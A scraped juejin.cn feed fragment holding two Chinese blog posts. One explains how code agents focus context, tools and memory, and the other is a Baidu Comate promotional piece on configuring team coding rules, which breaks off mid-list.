content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="twl"/> <meta itemprop="url" content="https://juejin.cn/user/3016715635534029"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            注意力机制在Code Agent的应用
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3016715635534029/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    twl
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:35:02.000Z" title="Tue Dec 16 2025 07:35:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 <strong>Code Agent（代码智能体）</strong> 的实际落地中，<strong>注意力机制（Attention）并不只是“Transformer 内部原理”</strong> ，而是被<strong>显式或隐式地工程化使用</strong>，直接影响效果、成本和可控性。下面从「能落地的实践视角」系统讲一下。</p>
<hr/>
<h2 data-id="heading-0">一句话总览</h2>
<blockquote>
<p>在 Code Agent 中，注意力机制的核心作用是：<br/>
<strong>把有限的上下文、算力和推理步骤，集中用在“当前最有价值的代码与信息”上。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-1">一、上下文注意力：解决「代码太多，窗口不够」</h2>
<h3 data-id="heading-2">1️⃣ 文件级 / 代码块级注意力（Context Routing）</h3>
<p><strong>问题</strong></p>
<ul>
<li>一个仓库几万行代码，LLM 上下文放不下</li>
<li>但 agent 只需要 <em>和当前任务最相关的部分</em></li>
</ul>
<p><strong>实践做法</strong></p>
<ul>
<li>
<p>先做一层「注意力筛选」：</p>
<ul>
<li>文件级：哪些文件最相关</li>
<li>代码块级：哪些函数 / class 最重要</li>
</ul>
</li>
<li>
<p>再把筛选结果送进 LLM</p>
</li>
</ul>
<p><strong>常见实现</strong></p>
<pre><code class="hljs language-css" lang="css">用户问题
  ↓
Embedding / 关键词 / 调用图
  ↓
<span class="hljs-attribute">Top</span>-K 文件
  ↓
<span class="hljs-attribute">Top</span>-K 函数
  ↓
LLM
</code></pre>
<p>📌 <strong>本质</strong>：<br/>
这是 <strong>“显式注意力”</strong> ，不是模型自己算的，而是工程层帮它“代劳”。</p>
<hr/>
<h3 data-id="heading-3">2️⃣ Diff / Patch 注意力（编辑型 Agent 必备）</h3>
<p>在 Cursor、Claude Code、Aider 这类工具中非常关键。</p>
<p><strong>做法</strong></p>
<ul>
<li>
<p>高度关注：</p>
<ul>
<li>最近修改的 diff</li>
<li>当前光标附近代码</li>
<li>报错栈涉及的函数</li>
</ul>
</li>
</ul>
<p><strong>效果</strong></p>
<ul>
<li>避免模型“通读整个文件”</li>
<li>提升修改精准度，减少误伤</li>
</ul>
<p>📌 Cursor 的「只改相关代码」能力，本质就是 <strong>diff-aware attention</strong></p>
<hr/>
<h2 data-id="heading-4">二、任务级注意力：让 Agent 不“跑偏”</h2>
<h3 data-id="heading-5">3️⃣ Planning Attention（计划阶段聚焦）</h3>
<p>在 <strong>多步 Code Agent（ReAct / Plan-Execute）</strong> 中：</p>
<pre><code class="hljs language-markdown" lang="markdown">Plan:
<span class="hljs-bullet">1.</span> 找到 Bug 位置
<span class="hljs-bullet">2.</span> 分析原因
<span class="hljs-bullet">3.</span> 修改代码
<span class="hljs-bullet">4.</span> 补测试
</code></pre>
<p><strong>注意力点</strong></p>
<ul>
<li>
<p>每一步只关注：</p>
<ul>
<li>当前目标</li>
<li>当前输入（代码 / 日志 / 结果）</li>
</ul>
</li>
</ul>
<p><strong>工程技巧</strong></p>
<ul>
<li>
<p>每步调用 LLM 时：</p>
<ul>
<li>丢弃无关历史</li>
<li>只保留「计划 + 当前上下文」</li>
</ul>
</li>
</ul>
<p>📌 这是 <strong>“时间维度的注意力裁剪”</strong></p>
<hr/>
<h3 data-id="heading-6">4️⃣ Error-driven Attention（错误驱动）</h3>
<p><strong>非常实用</strong></p>
<p>当 agent 运行代码失败：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-built_in">TypeError</span>: xxx is not <span class="hljs-keyword">callable</span>
  at foo.py:<span class="hljs-number">123</span>
</code></pre>
<p><strong>注意力自动转移到</strong></p>
<ul>
<li>报错文件</li>
<li>报错行</li>
<li>调用链</li>
</ul>
<p><strong>实现方式</strong></p>
<ul>
<li>解析 traceback</li>
<li>构建「错误相关上下文」</li>
<li>强制覆盖原上下文</li>
</ul>
<p>📌 这一步对 Code Agent 成功率提升非常大</p>
<hr/>
<h2 data-id="heading-7">三、工具 &amp; 记忆注意力：选“该用的工具 / 记忆”</h2>
<h3 data-id="heading-8">5️⃣ Tool Attention（工具选择）</h3>
<p>Code Agent 往往有多个工具：</p>
<ul>
<li>read_file</li>
<li>search</li>
<li>run_tests</li>
<li>run_code</li>
<li>git_diff</li>
</ul>
<p><strong>注意力机制体现为</strong></p>
<ul>
<li>
<p>根据当前任务状态</p>
</li>
<li>
<p>决定：</p>
<ul>
<li>用哪个工具</li>
<li>传哪些参数</li>
</ul>
</li>
</ul>
<p>📌 LLM 的 cross-attention：</p>
<blockquote>
<p>prompt（任务） ←→ tool schema（能力）</p>
</blockquote>
<hr/>
<h3 data-id="heading-9">6️⃣ Memory Attention（长期记忆不是全都重要）</h3>
<p>在带 <strong>Memory 的 Code Agent</strong> 中：</p>
<ul>
<li>历史修改习惯</li>
<li>项目约定</li>
<li>技术选型</li>
</ul>
<p><strong>做法</strong></p>
<ul>
<li>给记忆打标签 / embedding</li>
<li>每次只取与当前任务最相关的记忆</li>
</ul>
<p>📌 否则 memory 会变成「噪音仓库」</p>
<hr/>
<h2 data-id="heading-10">四、模型层注意力：代码特有优化</h2>
<h3 data-id="heading-11">7️⃣ 结构感知注意力（Code-aware Attention）</h3>
<p>代码不同于自然语言：</p>
<ul>
<li>强结构（AST）</li>
<li>强引用关系（调用 / import）</li>
<li>强局部性</li>
</ul>
<p><strong>实践方向</strong></p>
<ul>
<li>AST-aware chunking</li>
<li>函数 / class 作为 attention 单位</li>
<li>调用图增强检索</li>
</ul>
<p>📌 比“按 token 截断”好太多</p>
<hr/>
<h3 data-id="heading-12">8️⃣ 多模态注意力（代码 + 文档 + 测试）</h3>
<p>成熟的 Code Agent 会同时关注：</p>
<ul>
<li>代码</li>
<li>README / 设计文档</li>
<li>单测</li>
<li>日志</li>
</ul>
<p><strong>Attention 分配示例</strong></p>
<pre><code class="hljs language-shell" lang="shell">当前是修 Bug：
<span class="hljs-meta prompt_">  60% </span><span class="bash">错误日志</span>
<span class="hljs-meta prompt_">  30% </span><span class="bash">相关代码</span>
<span class="hljs-meta prompt_">  10% </span><span class="bash">文档</span>
</code></pre>
<p>这通常通过 <strong>prompt 结构 + 上下文配额控制</strong> 实现。</p>
<hr/>
<h2 data-id="heading-13">五、总结成一张表</h2>








































<table><thead><tr><th>层级</th><th>注意力作用</th><th>实际收益</th></tr></thead><tbody><tr><td>上下文层</td><td>选对代码</td><td>不爆上下文</td></tr><tr><td>任务层</td><td>聚焦当前步骤</td><td>不跑偏</td></tr><tr><td>错误层</td><td>围绕报错</td><td>修复成功率↑</td></tr><tr><td>工具层</td><td>用对工具</td><td>推理效率↑</td></tr><tr><td>记忆层</td><td>取对记忆</td><td>个性化</td></tr><tr><td>结构层</td><td>理解代码结构</td><td>修改更准</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-14">关键结论（很重要）</h2>
<blockquote>
<p><strong>Code Agent 的效果 ≠ 更大的模型</strong><br/>
<strong>而是 = 更聪明的注意力分配</strong></p>
</blockquote>
<p>很多“看起来很智能”的代码 agent：</p>
<ul>
<li>70% 是工程化 attention</li>
<li>30% 才是模型能力</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[给 AI 装上“员工手册”：如何用Rules 给文心快码 (Comate) 赋能提效？]]></title>    <link>https://juejin.cn/post/7584243498527358976</link>    <guid>https://juejin.cn/post/7584243498527358976</guid>    <pubDate>2025-12-16T07:53:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584243498527358976" data-draft-id="7584071941024251919" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="给 AI 装上“员工手册”：如何用Rules 给文心快码 (Comate) 赋能提效？"/> <meta itemprop="keywords" content="前端,程序员,前端框架"/> <meta itemprop="datePublished" content="2025-12-16T07:53:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="文心快码BaiduComate"/> <meta itemprop="url" content="https://juejin.cn/user/992209294070809"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            给 AI 装上“员工手册”：如何用Rules 给文心快码 (Comate) 赋能提效？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/992209294070809/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    文心快码BaiduComate
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T07:53:45.000Z" title="Tue Dec 16 2025 07:53:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>百度文心快码（Comate）的 <strong>Rules</strong> 功能通过注入企业级“员工手册”，让 AI 精准掌握业务规范与逻辑，将复杂开发周期缩短 <strong>40%</strong> ，真正实现工程效能的质变。</p>
</blockquote>
<p>为什么同样的AI编程助手，有人用来当“百度百科”，有人却能用它替代50%的重复劳动？百度文心快码（Comate） 的 Rules（自定义规则） 功能是分水岭。它就像给AI装上了“企业级员工手册”，能让AI精准读懂业务逻辑、强制统一代码风格、自动规避架构风险。实测数据显示，熟练配置Rules后，复杂业务模块开发周期可缩短40%，Bug排查效率提升百倍，真正实现从“通用大模型”到“懂业务的专属资深架构师”的进化。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0513e68bac84433a966e086e0bc14282~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paH5b-D5b-r56CBQmFpZHVDb21hdGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476425&amp;x-signature=aAyEkML3PKKbU6ooDXPjsse5yv0%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f08715fdf2b4dfea4a836a6b29b4f10~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5paH5b-D5b-r56CBQmFpZHVDb21hdGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766476425&amp;x-signature=TBgB3dns9MakzcJrq79oybDlsOk%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h2 data-id="heading-0">01/ Comate + Rules，提效成果如何？</h2>
<ul>
<li><strong>效率质变数据</strong>：百度核心业务场景中，配置Rules后，标准化页面生成的开发周期从 <strong>5天压缩至3天</strong>；针对特定逻辑Bug的排查修复时间，从人工排查的 <strong>1天骤降至10分钟</strong>。</li>
<li><strong>代码规范“紧箍咒”</strong> ：Rules 能够对AI生成代码进行工程级约束。例如：强制CSS类名使用Kebab-case（短横线命名）；强制组件必须引入项目通用的 .less 变量库；禁止生成深层嵌套的“回调地狱”结构。</li>
<li><strong>团队协作零磨损</strong>：Rules 支持 <strong>Team-Level（团队级）</strong> 配置共享。架构师制定一套规则（如“所有金额字段必须经过 formatCurrency 处理”），全团队成员的 Comate 自动生效。这直接消灭了 Code Review 中 80% 关于代码风格的争论。</li>
<li><strong>全栈场景覆盖</strong>：不仅限于前端组件，Rules 同样适用于后端（Restful 接口规范、日志脱敏格式）、测试脚本（自动生成覆盖率要求）及文档撰写。它是将 AI 算力转化为工程生产力的核心中间件。</li>
</ul>
<h2 data-id="heading-1">02/ Rules能在哪些维度上约束Comate？</h2>
<p>很多开发者在使用 AI Coding 工具时都有过这样的挫败感：</p>
<blockquote>
<p>“每次都要告诉它：别用 var 用 const，别用原生 CSS 给我用 Less，别自己造轮子去调公共组件…… 只要新开一个对话窗口，它就全忘了，像个永远教不会的实习生。”</p>
</blockquote>
<p>这就是“通用大模型”的通病——它懂海量的代码知识，但不懂你团队的“潜规则”。</p>
<p><strong>Rules 的本质，就是 AI 的“持久化记忆”与“行为准则”。</strong></p>
<p>它不是简单的 Prompt 拼接，而是深植于 IDE 上下文的<strong>系统级逻辑</strong>。通过 Rules，我们将“个人偏好”和“团队规范”固化下来，让 Comate 在生成代码之前，先“查阅手册”，再“执行任务”。</p>
<h3 data-id="heading-2">1. 命名约定：代码界的“起名大会”终结者</h3>
<p>没有 Rules 时，AI 可能会生成 temp1、data_final、flag 这种毫无语义的变量名。</p>
<p>配置 Rules 后，你可以明确要求：</p>
<ul>
<li>所有布尔值变量必须以 is、has、can 开头。</li>
<li>私有方法必须以下划线 _ 开头。</li>
<li>事件处理函数必须遵循 handle + 动词 + 名词 的格式（如 handleSubmitOrder）。结果：团队代码风格高度统一，新人接手项目不再像“拆盲盒”。</li>
</ul>
<h3 data-id="heading-3">2. 代码结构：给模型戴上“紧箍咒”</h3>
<p>AI 为了省事，有时会写出“面条代码”或者“俄罗斯套娃”式的嵌套。Rules 可以设定架构红线：</p>
<ul>
<li><strong>组件拆分</strong>：单文件行数超过 300 行时，必须提示拆分为子组件。</li>
<li><strong>层级限制</strong>：HTML 标签嵌套不得超过 4 层，多余层级必须通过 CSS 布局解决。</li>
<li>目录规范：生成的图片资源引用路径必须指向 src/assets/images，组件文件必须归档在 src/components/common。结果：代码层次清晰，维护成本大幅降低。</li>
</ul>
<h3 data-id="heading-4">3. 业务逻辑层：AI 变身“逻辑交警”</h3>
<p>这是 Rules 最强大的地方。它能防止 AI 写出“跑得通但业务不对”的代码。</p>
<ul>
<li><strong>防御性编程</strong>：规定所有接口调用必须包裹 try-catch，且错误处理必须调用统一的 ErrorLogger 模块，而不是简单的 console.log。</li>
<li>UI 规范：规定所有“价格”展示必须使用  组件，严禁直接渲染数字。结果：从源头杜绝了业务逻辑漏洞，让代码天生具备健壮性。</li>
</ul>
<h2 data-id="heading-5">03/ 实战案例：资深前端如何用Rules让Comate效率翻倍？</h2>
<p>我们采访了资深前端开发者崔同学，他在高强度的业务开发中，将 Comate + Rules 玩出了新高度。</p>
<h3 data-id="heading-6">😭痛点：永远在“调教”的路上</h3>
<p>在未使用 Rules 之前，崔同学每天要花大量时间做“提示工程”。</p>
<p>“因为我们的项目是基于一套自研的移动端框架，有很多特殊的适配要求。每次让 AI 写页面，它默认都用标准的 React 写法，我得反复纠正：‘用了这个组件库要加按需加载’、‘样式要用 rem 转换函数’。有时候改 AI 写错的代码，比我自己写还累。”</p>
<h3 data-id="heading-7">💪解决方案：打造专属 Rules</h3>
<p>为了摆脱重复劳动，崔同学花了两天时间，将项目开发文档提炼成了 Comate 的 Rules 配置：</p>
<ul>
<li><strong>Class 类名处理</strong>：必须语义化，统一使用 - 连接，且层级扁平化。</li>
<li><strong>CSS 写法</strong>：尺寸单位严禁使用 px，必须调用项目内部的 convertUnit() 函数；样式文件必须启用 CSS Modules。</li>
<li><strong>组件开发</strong>：直接生成符合项目目录结构的组件代码，不要输出“使用示例”等废话。</li>
<li><strong>图片管理</strong>：所有图片占位符必须使用项目指定的 CDN 预设图。</li>
</ul>
<h3 data-id="heading-8">😍成效：从“改代码”到“审代码”</h3>
<p>“配置好 Rules 后，感觉 AI 突然‘开窍’了。”崔同学分享道，“现在生成一个标准的活动落地页，它会自动引入我们要的公共头尾组件，样式自动适配移动端，连埋点代码都能按规范插进去。以前做一个复杂页面要 5 天，现在 3 天就能上线，节省出来的 2 天我可以去研究更难的技术架构。”</p>
<p>最让崔同学印象深刻的是一次 Bug 排查：</p>
<p>“前阵子有个列表渲染的性能问题，如果人工排查可能要逐行看代码，耗时一天。但我之前在 Rules 里配置过‘列表渲染必须使用虚拟滚动组件’的规则。我把代码扔给 Comate，它结合 Rules 瞬间指出：‘此处未检测到虚拟滚动实现，违背性能规范，建议修改如下...’ 10分钟就解决了战斗。”</p>
<h2 data-id="heading-9">04/ 如何在Comate里配置高效的 Rules？</h2>
<p>配置 Rules 就像带徒弟，不能一蹴而就。以下是崔同学总结的“避坑心法”：</p>
<p>1.循序渐进，切忌贪多不要一开始就丢给 AI 几万字的开发文档。建议从“痛点”出发。</p>
<ul>
<li>第一阶段：只约束命名规范和文件路径。</li>
<li>第二阶段：加入常用的工具函数引用规则。</li>
<li>第三阶段：注入复杂的业务逻辑和架构模式。心法：让 AI 帮你写一段代码，发现哪里不合规，就把哪里提炼成 Rule。</li>
</ul>
<p>2.明确边界，安全第一必须</p>
<ul>
<li>在 Rules 中明确：“不引入未授权的外部 npm 包”、“涉及用户隐私字段（如手机号）必须调用 maskPhone 方法脱敏”。这能保证生成代码的合规性，避免引入安全漏洞。</li>
</ul>
<p>3.提供“情绪价值”这是一个有趣的发现：在 Rules 中加入正向反馈机制，能提升 AI 的表现。</p>
<ul>
<li>错误示范：“严禁写错，否则重写。”</li>
<li>正确示范：“你是一个经验丰富的架构师，请帮我按以下规范优化代码。如果在复杂逻辑处理上做得好，我会非常感激。”实测证明，带有角色设定和鼓励语气的 Rules，能让 AI 生成的代码注释更详尽，逻辑解释更清晰。</li>
</ul>
<p>4.全场景适用，打破偏见Rules 不仅是前端的专利。</p>
<ul>
<li><strong>后端</strong>：用 Rules 约束 API 接口必须符合 RESTful 规范，Swagger 注释必须包含具体字段说明。</li>
<li><strong>QA</strong>：用 Rules 规定生成的测试用例必须包含“边界值测试”和“异常流程测试”。</li>
<li><strong>PM/文档</strong>：用 Rules 规定需求文档必须包含“用户故事”、“验收标准”和“数据指标”。</li>
</ul>
<p>Rules 不仅限于前端，已在多领域验证了其价值：</p>
<ul>
<li><strong>后端</strong>：约束 Restful 接口规范及 Swagger 注释标准。</li>
<li><strong>测试</strong>：自动生成包含边界值与异常流程的测试脚本。</li>
